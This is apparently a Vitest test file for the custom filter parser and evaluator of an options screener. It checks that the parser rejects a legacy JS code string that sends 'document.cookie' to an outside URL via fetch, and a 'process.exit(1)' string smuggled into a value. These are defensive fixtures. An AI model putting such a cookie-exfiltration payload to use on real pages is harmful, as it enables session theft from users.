import { describe, it, expect } from 'vitest';
import {
  parseCustomFilter,
  evaluateCondition,
  matchesFilter,
  applyFilters,
  describeFilter,
  describeCondition,
  filterFields,
  splitFilter,
  FILTER_OPS,
  type CustomFilter,
  type FilterCondition,
} from './filters';
import { NUMERIC_FIELDS, type ScreenedOption } from './optionChain';

function row(overrides: Partial<ScreenedOption> = {}): ScreenedOption {
  return {
    expiration: '2026-10-16',
    daysToExpiration: 45,
    strike: 220,
    lastPrice: 1.7,
    high: 1.9,
    delta: 0.28,
    iv: 42.5,
    moneyness: 1.18,
    openInterest: 1200,
    volume: 350,
    capitalRequiredPerContract: 21744,
    premiumPerContract: 170,
    returnPct: 0.78,
    annualizedReturn: 6.34,
    returnWithGainPct: 0,
    annualizedReturnWithGain: 0,
    premiumSharePct: 100,
    totalProfitIfAssigned: 0,
    maxContracts: 0,
    totalCapitalRequired: 0,
    totalPremiumReceived: 0,
    ...overrides,
  };
}

const condition = (
  field: FilterCondition['field'],
  op: FilterCondition['op'],
  value: number[]
): FilterCondition => ({ field, op, value } as FilterCondition);

describe('evaluateCondition', () => {
  const option = row({ iv: 42.5 });

  it.each([
    ['gt', [40], true],
    ['gt', [45], false],
    ['gte', [42.5], true],
    ['lt', [45], true],
    ['lt', [40], false],
    ['lte', [42.5], true],
    ['eq', [42.5], true],
    ['eq', [42.6], false],
  ] as const)('iv %s %j -> %s', (op, value, expected) => {
    expect(evaluateCondition(option, condition('iv', op, [...value]))).toBe(expected);
  });

  it('treats between as inclusive', () => {
    expect(evaluateCondition(option, condition('iv', 'between', [40, 45]))).toBe(true);
    expect(evaluateCondition(option, condition('iv', 'between', [42.5, 42.5]))).toBe(true);
    expect(evaluateCondition(option, condition('iv', 'between', [10, 20]))).toBe(false);
  });

  it('accepts a reversed between pair rather than matching nothing', () => {
    expect(evaluateCondition(option, condition('iv', 'between', [45, 40]))).toBe(true);
  });

  it('handles negative values, as put deltas require', () => {
    const put = row({ delta: -0.31 });
    expect(evaluateCondition(put, condition('delta', 'gte', [-0.4]))).toBe(true);
    expect(evaluateCondition(put, condition('delta', 'lt', [-0.4]))).toBe(false);
  });

  it('is false when the column is NaN rather than throwing', () => {
    expect(evaluateCondition(row({ iv: NaN }), condition('iv', 'gt', [10]))).toBe(false);
  });

  it('covers every declared operator', () => {
    for (const op of FILTER_OPS) {
      const value = op === 'between' ? [0, 1e9] : [-1e9];
      const usable = op === 'lt' || op === 'lte' ? [1e9] : value;
      expect(typeof evaluateCondition(option, condition('iv', op, usable))).toBe('boolean');
    }
  });

  it('can address every numeric column', () => {
    for (const field of NUMERIC_FIELDS) {
      expect(typeof evaluateCondition(row(), condition(field, 'gte', [-1e12]))).toBe('boolean');
    }
  });
});

describe('matchesFilter', () => {
  const option = row({ iv: 42.5, openInterest: 1200 });

  it('requires every condition in "and" mode', () => {
    const filter: CustomFilter = {
      id: 'f1',
      name: 'High IV & OI',
      mode: 'and',
      conditions: [condition('iv', 'gt', [40]), condition('openInterest', 'gt', [500])],
    };
    expect(matchesFilter(option, filter)).toBe(true);
    expect(matchesFilter(row({ iv: 10, openInterest: 1200 }), filter)).toBe(false);
  });

  it('requires only one condition in "or" mode', () => {
    const filter: CustomFilter = {
      id: 'f2',
      name: 'Either',
      mode: 'or',
      conditions: [condition('iv', 'gt', [90]), condition('openInterest', 'gt', [500])],
    };
    expect(matchesFilter(option, filter)).toBe(true);
    expect(matchesFilter(row({ iv: 10, openInterest: 10 }), filter)).toBe(false);
  });
});

describe('applyFilters', () => {
  const rows = [
    row({ strike: 200, iv: 30 }),
    row({ strike: 220, iv: 45 }),
    row({ strike: 240, iv: 60 }),
  ];

  it('returns everything when there are no filters', () => {
    expect(applyFilters(rows, [])).toHaveLength(3);
  });

  it('ANDs separate filters together', () => {
    const result = applyFilters(rows, [
      { id: 'a', name: 'IV > 35', mode: 'and', conditions: [condition('iv', 'gt', [35])] },
      { id: 'b', name: 'strike < 235', mode: 'and', conditions: [condition('strike', 'lt', [235])] },
    ]);
    expect(result.map((r) => r.strike)).toEqual([220]);
  });
});

describe('parseCustomFilter — accepts', () => {
  it('a well-formed single-condition filter', () => {
    const result = parseCustomFilter({
      id: 'high-iv',
      name: 'High IV',
      mode: 'and',
      conditions: [{ field: 'iv', op: 'gt', value: [50] }],
    });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.filter.conditions).toHaveLength(1);
  });

  it('a between condition with a [low, high] pair', () => {
    const result = parseCustomFilter({
      id: 'ann',
      name: 'Annualized 20-60%',
      mode: 'and',
      conditions: [{ field: 'annualizedReturn', op: 'between', value: [20, 60] }],
    });
    expect(result.ok).toBe(true);
  });

  it('defaults mode to "and" when the model omits it', () => {
    const result = parseCustomFilter({
      id: 'x',
      name: 'x',
      conditions: [{ field: 'iv', op: 'gt', value: [50] }],
    });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.filter.mode).toBe('and');
  });
});

describe('parseCustomFilter — rejects', () => {
  const base = { id: 'f', name: 'f', mode: 'and' as const };

  it('an unknown field', () => {
    const result = parseCustomFilter({
      ...base,
      conditions: [{ field: 'sharpeRatio', op: 'gt', value: [1] }],
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/field/);
  });

  it('a field that exists on the row but is not numeric', () => {
    const result = parseCustomFilter({
      ...base,
      conditions: [{ field: 'expiration', op: 'gt', value: [1] }],
    });
    expect(result.ok).toBe(false);
  });

  it('an unknown operator', () => {
    const result = parseCustomFilter({
      ...base,
      conditions: [{ field: 'iv', op: 'matches', value: [1] }],
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/op/);
  });

  // The whole point of the change: a JS expression is no longer expressible.
  it('the old code-string shape', () => {
    const result = parseCustomFilter({
      id: 'f',
      name: 'evil',
      code: 'fetch("https://example.com?c="+document.cookie) || true',
    });
    expect(result.ok).toBe(false);
  });

  it('a code string smuggled into a value', () => {
    const result = parseCustomFilter({
      ...base,
      conditions: [{ field: 'iv', op: 'gt', value: ['process.exit(1)'] }],
    });
    expect(result.ok).toBe(false);
  });

  it('between with only one value', () => {
    const result = parseCustomFilter({
      ...base,
      conditions: [{ field: 'iv', op: 'between', value: [50] }],
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/two values/);
  });

  it('a scalar operator given two values', () => {
    const result = parseCustomFilter({
      ...base,
      conditions: [{ field: 'iv', op: 'gt', value: [50, 60] }],
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/exactly one value/);
  });

  it('an empty condition list', () => {
    expect(parseCustomFilter({ ...base, conditions: [] }).ok).toBe(false);
  });

  it('more than ten conditions', () => {
    const conditions = Array.from({ length: 11 }, () => ({ field: 'iv', op: 'gt', value: [1] }));
    expect(parseCustomFilter({ ...base, conditions }).ok).toBe(false);
  });

  it('NaN and Infinity values', () => {
    expect(
      parseCustomFilter({ ...base, conditions: [{ field: 'iv', op: 'gt', value: [NaN] }] }).ok
    ).toBe(false);
    expect(
      parseCustomFilter({ ...base, conditions: [{ field: 'iv', op: 'gt', value: [Infinity] }] }).ok
    ).toBe(false);
  });

  it('junk input entirely', () => {
    expect(parseCustomFilter(null).ok).toBe(false);
    expect(parseCustomFilter('drop table').ok).toBe(false);
    expect(parseCustomFilter(undefined).ok).toBe(false);
  });

  it('always reports a non-empty reason, never a silent drop', () => {
    const result = parseCustomFilter({ ...base, conditions: [{ field: 'nope', op: 'gt', value: [1] }] });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.length).toBeGreaterThan(0);
  });
});

describe('describe helpers', () => {
  it('renders a scalar condition', () => {
    expect(describeCondition(condition('iv', 'gt', [50]))).toBe('iv > 50');
  });

  it('renders a between condition', () => {
    expect(describeCondition(condition('annualizedReturn', 'between', [20, 60]))).toBe(
      'annualizedReturn between 20 and 60'
    );
  });

  it('joins conditions with the filter mode', () => {
    const filter: CustomFilter = {
      id: 'f',
      name: 'f',
      mode: 'or',
      conditions: [condition('iv', 'gt', [50]), condition('volume', 'gte', [100])],
    };
    expect(describeFilter(filter)).toBe('iv > 50 or volume ≥ 100');
  });
});

describe('which filter replaces which', () => {
  const filter = (id: string, fields: string[]): CustomFilter => ({
    id,
    name: id,
    mode: 'and',
    conditions: fields.map((field) => ({ field, op: 'gt', value: [1] })) as CustomFilter['conditions'],
  });

  it('gives two filters on the same column the same signature', () => {
    // "IV above 40" then "make that 30" must not both be in force; ANDed, the
    // stricter one silently wins and the request appears to do nothing.
    expect(filterFields(filter('a', ['iv']))).toBe(filterFields(filter('b', ['iv'])));
  });

  it('separates filters on different columns', () => {
    expect(filterFields(filter('a', ['iv']))).not.toBe(filterFields(filter('b', ['delta'])));
  });

  it('ignores the order the columns were written in', () => {
    expect(filterFields(filter('a', ['iv', 'delta']))).toBe(filterFields(filter('b', ['delta', 'iv'])));
  });

  it('collapses a column named twice, as a range does', () => {
    expect(filterFields(filter('a', ['iv', 'iv']))).toBe('iv');
  });
});

describe('splitting a bundled filter into one per column', () => {
  const bundled: CustomFilter = {
    id: 'bundle',
    name: 'Prem20_OI100_Vol100',
    mode: 'and',
    conditions: [
      { field: 'premiumSharePct', op: 'gte', value: [20] },
      { field: 'openInterest', op: 'gt', value: [100] },
      { field: 'volume', op: 'gt', value: [100] },
    ],
  };

  it('gives each column its own filter', () => {
    // The reported bundle: one chip, all or nothing, no way to loosen the
    // volume rule without restating the other two.
    const parts = splitFilter(bundled);
    expect(parts).toHaveLength(3);
    expect(parts.map((f) => f.conditions[0].field)).toEqual([
      'premiumSharePct',
      'openInterest',
      'volume',
    ]);
  });

  it('gives them distinct ids, so they do not replace each other', () => {
    const ids = splitFilter(bundled).map((f) => f.id);
    expect(new Set(ids).size).toBe(3);
  });

  it('names each after its column', () => {
    const parts = splitFilter(bundled, (field) => `Column ${field}`);
    expect(parts.map((f) => f.name)).toEqual([
      'Column premiumSharePct',
      'Column openInterest',
      'Column volume',
    ]);
  });

  it('keeps a range on one column together', () => {
    // Split, these two would be filters over the same column, and the
    // replace-by-column rule would drop whichever landed first.
    const range: CustomFilter = {
      id: 'range',
      name: 'IV band',
      mode: 'and',
      conditions: [
        { field: 'iv', op: 'gt', value: [30] },
        { field: 'iv', op: 'lt', value: [50] },
      ],
    };
    expect(splitFilter(range)).toEqual([range]);
  });

  it('splits the columns but keeps each column whole', () => {
    const mixed: CustomFilter = {
      id: 'mixed',
      name: 'Mixed',
      mode: 'and',
      conditions: [
        { field: 'iv', op: 'gt', value: [30] },
        { field: 'volume', op: 'gt', value: [100] },
        { field: 'iv', op: 'lt', value: [50] },
      ],
    };
    const parts = splitFilter(mixed);
    expect(parts).toHaveLength(2);
    expect(parts[0].conditions).toHaveLength(2);
    expect(parts[1].conditions).toHaveLength(1);
  });

  it('never splits an or filter, which would change what it means', () => {
    const either: CustomFilter = {
      id: 'either',
      name: 'Either',
      mode: 'or',
      conditions: [
        { field: 'volume', op: 'gt', value: [500] },
        { field: 'openInterest', op: 'gt', value: [500] },
      ],
    };
    // Separate filters are ANDed, so splitting an "or" tightens it silently.
    expect(splitFilter(either)).toEqual([either]);
  });

  it('leaves a single condition alone', () => {
    const one: CustomFilter = {
      id: 'one',
      name: 'IV',
      mode: 'and',
      conditions: [{ field: 'iv', op: 'gt', value: [40] }],
    };
    expect(splitFilter(one)).toEqual([one]);
  });
});
